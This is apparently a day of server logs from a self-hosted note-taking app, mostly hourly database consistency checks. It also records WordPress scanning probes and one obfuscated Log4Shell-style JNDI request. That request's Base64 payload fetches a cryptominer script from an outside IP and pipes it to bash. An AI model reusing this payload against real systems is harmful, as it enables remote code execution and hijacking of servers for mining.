00:22:04.665 Table counts: notes: 287, revisions: 18, attachments: 38, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 227
00:22:04.684 All consistency checks passed with no errors detected (took 19ms)
01:02:10.342 Error: Router not found for request GET //wp-includes/wlwmanifest.xml
01:02:10.590 Error: Router not found for request GET //xmlrpc.php?rsd
01:02:11.085 Error: Router not found for request GET //blog/wp-includes/wlwmanifest.xml
01:02:11.327 Error: Router not found for request GET //web/wp-includes/wlwmanifest.xml
01:02:11.568 Error: Router not found for request GET //wordpress/wp-includes/wlwmanifest.xml
01:02:11.809 Error: Router not found for request GET //website/wp-includes/wlwmanifest.xml
01:02:12.050 Error: Router not found for request GET //wp/wp-includes/wlwmanifest.xml
01:02:12.289 Error: Router not found for request GET //news/wp-includes/wlwmanifest.xml
01:02:12.531 Error: Router not found for request GET //2018/wp-includes/wlwmanifest.xml
01:02:12.771 Error: Router not found for request GET //2019/wp-includes/wlwmanifest.xml
01:02:13.013 Error: Router not found for request GET //shop/wp-includes/wlwmanifest.xml
01:02:13.254 Error: Router not found for request GET //wp1/wp-includes/wlwmanifest.xml
01:02:13.496 Error: Router not found for request GET //test/wp-includes/wlwmanifest.xml
01:02:13.737 Error: Router not found for request GET //media/wp-includes/wlwmanifest.xml
01:02:13.976 Error: Router not found for request GET //wp2/wp-includes/wlwmanifest.xml
01:02:14.215 Error: Router not found for request GET //site/wp-includes/wlwmanifest.xml
01:02:14.455 Error: Router not found for request GET //cms/wp-includes/wlwmanifest.xml
01:02:14.698 Error: Router not found for request GET //sito/wp-includes/wlwmanifest.xml
01:22:04.668 Table counts: notes: 287, revisions: 18, attachments: 38, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 227
01:22:04.676 All consistency checks passed with no errors detected (took 8ms)
02:22:04.686 Table counts: notes: 287, revisions: 18, attachments: 38, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 227
02:22:04.697 All consistency checks passed with no errors detected (took 11ms)
03:22:04.701 Table counts: notes: 287, revisions: 18, attachments: 38, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 227
03:22:04.711 All consistency checks passed with no errors detected (took 10ms)
04:22:04.706 Table counts: notes: 287, revisions: 18, attachments: 38, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 227
04:22:04.720 All consistency checks passed with no errors detected (took 14ms)
05:22:04.711 Table counts: notes: 287, revisions: 18, attachments: 38, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 227
05:22:04.724 All consistency checks passed with no errors detected (took 14ms)
06:22:04.717 Table counts: notes: 287, revisions: 18, attachments: 38, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 227
06:22:04.732 All consistency checks passed with no errors detected (took 16ms)
07:22:04.724 Table counts: notes: 287, revisions: 18, attachments: 38, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 227
07:22:04.734 All consistency checks passed with no errors detected (took 11ms)
08:22:04.727 Table counts: notes: 287, revisions: 18, attachments: 38, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 227
08:22:04.738 All consistency checks passed with no errors detected (took 11ms)
09:21:59.590 Optimizing database
09:21:59.592 Optimization finished in 1ms.
09:22:04.730 Table counts: notes: 287, revisions: 18, attachments: 38, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 227
09:22:04.743 All consistency checks passed with no errors detected (took 14ms)
10:22:04.735 Table counts: notes: 287, revisions: 18, attachments: 38, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 227
10:22:04.745 All consistency checks passed with no errors detected (took 11ms)
11:22:04.740 Table counts: notes: 287, revisions: 18, attachments: 38, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 227
11:22:04.753 All consistency checks passed with no errors detected (took 14ms)
12:22:04.745 Table counts: notes: 287, revisions: 18, attachments: 38, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 227
12:22:04.759 All consistency checks passed with no errors detected (took 14ms)
13:22:04.749 Table counts: notes: 287, revisions: 18, attachments: 38, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 227
13:22:04.763 All consistency checks passed with no errors detected (took 15ms)
14:22:04.753 Table counts: notes: 287, revisions: 18, attachments: 38, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 227
14:22:04.767 All consistency checks passed with no errors detected (took 15ms)
14:52:13.935 Error: Router not found for request GET /$%7Bj$%7Bk8s:k5:-ND%7Di$%7Bsd:k5:-:%7Dldap://46.8.226.196:3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vNDYuOC4yMjYuMTk2L3NjcmlwdHMvNHRoZXBvb2xfbWluZXIuc2ggfCBiYXNoIC1zOyB3Z2V0IC1xTy0gaHR0cDovLzQ2LjguMjI2LjE5Ni9zY3JpcHRzLzR0aGVwb29sX21pbmVyLnNoIHwgYmFzaCAtcw==%7D
15:22:04.755 Table counts: notes: 287, revisions: 18, attachments: 38, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 227
15:22:04.763 All consistency checks passed with no errors detected (took 9ms)
16:22:04.758 Table counts: notes: 287, revisions: 18, attachments: 38, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 227
16:22:04.769 All consistency checks passed with no errors detected (took 12ms)
17:22:04.757 Table counts: notes: 287, revisions: 18, attachments: 38, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 227
17:22:04.767 All consistency checks passed with no errors detected (took 10ms)
17:26:40.448 Error: Router not found for request GET /ads.txt
18:22:04.774 Table counts: notes: 287, revisions: 18, attachments: 38, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 227
18:22:04.783 All consistency checks passed with no errors detected (took 10ms)
19:21:59.599 Optimizing database
19:21:59.602 Optimization finished in 1ms.
19:22:04.777 Table counts: notes: 287, revisions: 18, attachments: 38, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 227
19:22:04.794 All consistency checks passed with no errors detected (took 18ms)
20:22:04.783 Table counts: notes: 287, revisions: 18, attachments: 38, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 227
20:22:04.800 All consistency checks passed with no errors detected (took 17ms)
21:22:04.788 Table counts: notes: 287, revisions: 18, attachments: 38, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 227
21:22:04.802 All consistency checks passed with no errors detected (took 14ms)
22:22:04.796 Table counts: notes: 287, revisions: 18, attachments: 38, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 227
22:22:04.809 All consistency checks passed with no errors detected (took 14ms)
23:22:04.803 Table counts: notes: 287, revisions: 18, attachments: 38, branches: 290, attributes: 441, etapi_tokens: 0, blobs: 227
23:22:04.817 All consistency checks passed with no errors detected (took 15ms)
